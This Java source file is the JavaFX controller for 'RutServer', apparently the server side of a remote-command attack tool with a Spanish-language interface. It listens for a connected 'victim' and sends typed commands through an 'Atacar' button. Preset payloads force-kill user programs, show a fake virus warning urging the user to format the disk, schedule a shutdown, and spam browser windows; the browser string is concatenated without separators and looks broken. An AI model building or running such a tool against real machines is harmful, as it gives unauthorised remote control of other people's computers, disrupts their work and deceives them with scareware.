/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/javafx/FXMLController.java to edit this template
 */
package rutserver;

import java.io.IOException;
import java.net.URL;
import java.util.ResourceBundle;
import javafx.application.Platform;
import javafx.concurrent.Task;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.Menu;
import javafx.scene.control.MenuItem;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.control.ToolBar;
import javafx.scene.image.ImageView;
import javafx.scene.input.InputMethodEvent;
import javafx.scene.layout.AnchorPane;
import javafx.scene.layout.Pane;
import javafx.scene.layout.VBox;
import javax.swing.JOptionPane;

/**
 * FXML Controller class
 *
 * @author javii
 */
public class RutServerController implements Initializable {

    @FXML
    private VBox Interfaz;
    @FXML
    private Menu Info;
    @FXML
    private MenuItem InfoEspecifica;
    @FXML
    private Menu ChangePort;
    @FXML
    private MenuItem ChangePortEspecifica;
    @FXML
    private Menu HowToUse;
    @FXML
    private MenuItem HowToUseEspecifica;
    @FXML
    private Menu Quit;
    @FXML
    private MenuItem QuitEspecifica;
    @FXML
    private AnchorPane InterfazPane;
    @FXML
    private ImageView FotoRut1;
    @FXML
    private ImageView FotoRut2;
    @FXML
    private Label Titulo;
    @FXML
    private TextArea Comando;
    @FXML
    private Button Conectar;
    @FXML
    private Button Atacar;
    @FXML
    private ToolBar Ejemplos;
    @FXML
    private Button MouseFlip;
    @FXML
    private Button Virus;
    @FXML
    private Button ApagarPC;
    @FXML
    private Button PaginaWebInfinita;
    @FXML
    private Pane HowToUsePane;
    @FXML
    private Button HowToUseQuit;
    @FXML
    private Pane InfoPane;
    @FXML
    private TextField IPVictima;
    @FXML
    private TextField Puerto;
    @FXML
    private TextField Estado;
    @FXML
    private Pane ChangePortPane;
    @FXML
    private TextField ChangePortTF;

    /**
     * Initializes the controller class.
     */
    @Override
    public void initialize(URL url, ResourceBundle rb) {
        // TODO
    }

    @FXML
    private void EjecutarInfo(ActionEvent event) {
        InfoPane.setVisible(true);
        if (rutServer.server.getVictimIP() == null) {
            IPVictima.setText("No conectado");
        } else {
            IPVictima.setText(rutServer.server.getVictimIP());
        }
        if (rutServer.server.getPort() == null) {
            Puerto.setText("0000");
        } else {
            Puerto.setText(rutServer.server.getPort());
        }

        if (rutServer.server.isClosed()) {
            Estado.setText("CERRADO!");
        } else {
            Estado.setText("ABIERTO!");
        }
    }

    @FXML
    private void EjecutarChangePort(ActionEvent event) {
        ChangePortPane.setVisible(true);
    }

    @FXML
    private void EjecutarHowToUse(ActionEvent event) {
        HowToUsePane.setVisible(true);
    }

    @FXML
    private void EjecutarQuit(ActionEvent event) throws IOException {
        rutServer.server.closeConnection();
        Platform.exit();
    }

    @FXML
    private void EjecutarConectar(ActionEvent event) {
        Task<Void> task = new Task<Void>() {
            @Override
            protected Void call() throws Exception {
                rutServer.server.StartListening(Integer.parseInt(ChangePortTF.getText()));
                return null;
            }
        };

        task.setOnSucceeded(e -> {
            Comando.setEditable(true);
            Ejemplos.setDisable(false);
            Atacar.setDisable(false);
            MouseFlip.setDisable(false);
            Virus.setDisable(false);
            ApagarPC.setDisable(false);
            PaginaWebInfinita.setDisable(false);
            ChangePortPane.setVisible(false);
        });

        new Thread(task).start();
    }

    @FXML
    private void EjecutarAtacar(ActionEvent event) throws IOException {
        Task<Void> task = new Task<Void>() {
            @Override
            protected Void call() throws Exception {
                rutServer.server.Send(Comando.getText());
                return null;
            }
        };

        task.setOnSucceeded(e -> {
            JOptionPane.showMessageDialog(null, "Ataque realizado");
        });

        new Thread(task).start();
    }

    @FXML
    private void EjecutarMouseFlip(ActionEvent event) throws IOException {
        Comando.setText("@echo off\n"
                + "\n"
                + "TASKKILL /F /IM wscript.exe\n"
                + "TASKKILL /F /IM notepad.exe\n"
                + "TASKKILL /F /IM calc.exe\n"
                + "TASKKILL /F /IM WINWORD.EXE");
        EjecutarAtacar(event);
    }

    @FXML
    private void EjecutarVirus(ActionEvent event) throws IOException {
        Comando.setText("lol=msgbox "
                + "(\"Un virus muy peligroso ha sido detectado en su computadora. "
                + "Presione SI para formatear su disco duro o NO para salvar sus datos, "
                + "reiniciar el sistema y posteriormente formatearlo.\",20,\"Warning\") ");
        EjecutarAtacar(event);
    }

    @FXML
    private void EjecutarApagarPC(ActionEvent event) throws IOException {
        Comando.setText("shutdown -s -t 60");
        EjecutarAtacar(event);
    }

    @FXML
    private void EjecutarPagWebInf(ActionEvent event) throws IOException {
        Comando.setText("Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com"
                + "Start www.google.com");
        EjecutarAtacar(event);
    }

    @FXML
    private void HowToUsePaneQuit(ActionEvent event) {
        HowToUsePane.setVisible(false);
    }

    @FXML
    private void InfoPaneQuit(ActionEvent event) {
        InfoPane.setVisible(false);
    }

    @FXML
    private void PuertoCambiado(InputMethodEvent event) {
    }

}
